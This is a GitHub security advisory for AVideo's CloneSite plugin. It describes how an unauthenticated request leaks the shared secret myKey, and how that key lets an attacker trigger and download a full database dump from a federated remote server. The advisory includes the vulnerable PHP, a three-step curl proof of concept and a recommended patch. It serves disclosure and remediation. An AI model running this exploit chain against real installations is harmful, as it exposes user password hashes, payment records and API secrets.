# [H] AVideo: Unauthenticated Disclosure of CloneSite `myKey` via Error Echo in `cloneClient.json.php` Enables Cross-Site DB Dump of the Configured Clone Server

## Summary
Severity: High
Advisory: GHSA-qm9p-p5pw-jrx2
CVE: CVE-2026-43873
CWE: CWE-209
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-qm9p-p5pw-jrx2
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

`plugin/CloneSite/cloneClient.json.php` echoes the local CloneSite shared secret (`$objClone->myKey`, a constant `md5($global['systemRootPath'] . $global['salt'])`) into the HTTP response body on every unauthenticated request. The unauthenticated error branch was intended to reject non-admin callers without a valid key, but the rejection message interpolates the expected key before `die()`. When the victim has CloneSite configured with a remote `cloneSiteURL` (standard federation/backup setup), the leaked `myKey` is exactly the credential that authenticates the victim to that remote server's `cloneServer.json.php`, allowing the attacker to impersonate the victim and trigger a full `mysqldump` of the remote's database to the remote's public `videos/clones/` directory.

## Details

### 1. The leak (`plugin/CloneSite/cloneClient.json.php:51-60`)

```php
$objCloneOriginal = $objClone;
$argv[1] = preg_replace("/[^A-Za-z0-9 ]/", '', empty($argv[1])?'':$argv[1]);

if (empty($objClone) || empty($argv[1]) || $objClone->myKey !== $argv[1]) {
    if (!User::isAdmin()) {
        $resp->msg = "You can't do this";
        $log->add("Clone: {$resp->msg}");
        echo "$objClone->myKey !== $argv[1]";   // <-- interpolates myKey
        die(json_encode($resp));
    }
}
```

Under PHP's web SAPI, the script-scope `$argv` global is not populated from the query string (only `$_SERVER['argv']` is populated, and only when `register_argc_argv=On`). Verified on this host (PHP 8.4.16, built-in web server):

```
bool(false)                # isset($argv)
string(9) "undefined"      # $argv ?? 'undefined'
string(9) "undefined"      # $_SERVER['argv']
string(9) "undefined"      # $argv[1]
bool(true)                 # empty($argv[1])
```

Because `empty($argv[1])` is true, line 51's `preg_replace` returns `''` and `$argv[1]` becomes `''`. Line 53 therefore enters the outer `if` (empty key). `User::isAdmin()` returns false for unauthenticated callers, so line 57 runs and echoes the contents of `$objClone->myKey` into the response body before `die()`. The response body looks like:

```
<32-hex-char md5> !== {"error":true,"msg":"You can't do this"}
```

The 32-hex prefix is the local `myKey`.

### 2. Where `myKey` comes from (`plugin/CloneSite/CloneSite.php:67`)

```php
$obj->myKey = md5($global['systemRootPath'].$global['salt']);
```

`myKey` is a static per-installation value generated from `systemRootPath` and `salt`. It never rotates.

### 3. Why the leaked key is dangerous (cross-site chain)

`cloneClient.json.php:75` shows `myKey` is the credential the client presents to its configured remote clone server:

```php
$url = $objClone->cloneSiteURL . "plugin/CloneSite/cloneServer.json.php?url="
     . urlencode($global['webSiteRootURL']) . "&key={$objClone->myKey}&useRsync=" . intval($objClone->useRsync);
```

On the remote side, `plugin/CloneSite/cloneServer.json.php:32-42` calls `Clones::thisURLCanCloneMe($_GET['url'], $_GET['key'])`, which in `plugin/CloneSite/Objects/Clones.php:73-101` does only:

```php
$clone = new Clones(0);
$clone->loadFromURL($url);
...
if ($clone->getKey() !== $key) { $resp->msg = "Invalid Key"; return $resp; }
if ($clone->getStatus() !== 'a') { ... }
```

For any federation pair the remote admin has approved (`status='a'`), supplying `url=<victim>&key=<leaked myKey>` passes this check. `cloneServer.json.php:86-90` then runs an unconditional `mysqldump` of every table except `CachesInDB`:

```php
$cmd = "mysqldump -u {$mysqlUser} -p'{$mysqlPass}' --host {$mysqlHost} ".
       " --default-character-set=utf8mb4 {$mysqlDatabase} {$tablesList} > $sqlFile";
exec($cmd . " 2>&1", $output, $return_val);
...
echo json_encode($resp);   // includes $resp->sqlFile = "Clone_mysqlDump_<uniqid>.sql"
```

The dump lands in `{videosDir}/clones/<sqlFile>`, and `videos/` is a public static directory in default AVideo deployments, so the attacker can fetch it with one more unauthenticated request.

### 4. Not fixed by the previous `clones.json.php` hardening

Commit `160e02635`/earlier added `if (!User::isAdmin())` guards to `plugin/CloneSite/clones.json.php` (the table-management endpoint that lists server-side per-client keys, previously advisory-submitted as CWE-306). That fix does not apply to `cloneClient.json.php`, which is a separate file and discloses a structurally different secret (the local `myKey`, not the per-URL server-side keys).

## PoC

Prerequisite: target installation has the `CloneSite` plugin enabled with a configured `cloneSiteURL` (this is the standard use: federated backup / site cloning). No authentication required.

**Step 1 — leak the local `myKey` (unauthenticated GET):**

```bash
curl -s 'https://victim.example.com/plugin/CloneSite/cloneClient.json.php'
```

Response body:

```
3f2a7c8b9d6e4f1a0b5c7d8e9f2a3b4c !== {"error":true,"msg":"You can't do this"}
```

The 32-hex-character prefix is `$objClone->myKey`.

**Step 2 — use the leaked `myKey` to make the victim's configured remote dump its own database:**

```bash
curl -s 'https://remote-server.example.com/plugin/CloneSite/cloneServer.json.php?url=https%3A%2F%2Fvictim.example.com%2F&key=3f2a7c8b9d6e4f1a0b5c7d8e9f2a3b4c&useRsync=0'
```

Response (truncated):

```json
{"error":false,"url":"https://victim.example.com/","key":"...","videosDir":"...","sqlFile":"Clone_mysqlDump_65f3a2b14c7e8.sql","videoFiles":[...],"photoFiles":[...]}
```

**Step 3 — download the full database dump from the remote's public `videos/` directory:**

```bash
curl -O 'https://remote-server.example.com/videos/clones/Clone_mysqlDump_65f3a2b14c7e8.sql'
```

This file contains every table except `CachesInDB` — `users` (including password hashes), payment records, API secrets, plugin configuration, etc.

## Impact

- Any unauthenticated attacker can retrieve the CloneSite shared secret (`myKey`) of any AVideo installation that has the plugin enabled. `myKey` is static and never rotates on its own.
- When that installation is federated with a remote CloneSite server (the standard use of the plugin), the leaked key permits the attacker to impersonate the victim client to the remote. `cloneServer.json.php` on the remote performs no additional authentication, runs an unconditional `mysqldump`, and places the result under the web-accessible `videos/clones/` directory — so a single leaked `myKey` leads to a full database dump (users, password hashes, payment and plugin configuration, API credentials) of the remote partner, downloadable over HTTP.
- The compromise crosses the federation boundary: leaking the key on site A yields the database of site B. This is scope-changing in practice even if CVSS scope is formally `Unchanged`.
- The `clones.json.php` hardening (the previously reported CWE-306 fix) does not cover this path; `cloneClient.json.php` is a distinct file that exposes a structurally different credential.

## Recommended Fix

Do not echo the expected key in the rejection message, and reject non-CLI / non-admin callers cleanly. Example patch for `plugin/CloneSite/cloneClient.json.php:51-60`:

```php
// Only accept the key argument from actual CLI invocations (intended usage:
// cron "php .../cloneClient.json.php <myKey>"). Over HTTP, require admin.
$cliKey = (PHP_SAPI === 'cli' && !empty($argv[1]))
    ? preg_replace("/[^A-Za-z0-9 ]/", '', $argv[1])
    : '';

if (empty($objClone) || empty($cliKey) || $objClone->myKey !== $cliKey) {
    if (!User::isAdmin()) {
        $resp->msg = "You can't do this";
        $log->add("Clone: {$resp->msg}");
        // Do NOT echo $objClone->myKey — it is a shared secret used to
        // authenticate to the configured remote clone server.
        die(json_encode($resp));
    }
}
```

Additional hardening recommended:

- Replace the static `myKey = md5(systemRootPath . salt)` with a randomly generated, per-installation key stored in the plugin configuration that can be rotated (see similar advice from GHSA-wqcc-qf63-c2x4 / CWE-331 on AVideo secret generation).
- On the remote side (`cloneServer.json.php`), consider requiring the `sqlFile` path to be unguessable (already is, via `uniqid()`) AND gating the dump behind an IP allowlist or an additional pre-shared rotating token, so that loss of a client's `myKey` does not immediately yield a full database dump.
- Serve `videos/clones/` with an `.htaccess`/nginx rule that denies direct HTTP access, so that even if a rogue client is authenticated, the dump is not downloadable over the web.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-qm9p-p5pw-jrx2
- https://nvd.nist.gov/vuln/detail/CVE-2026-43873
- https://github.com/WWBN/AVideo/commit/e6566f56a28f4556b2a0a09d03717a719dcb49da
- https://github.com/WWBN/AVideo
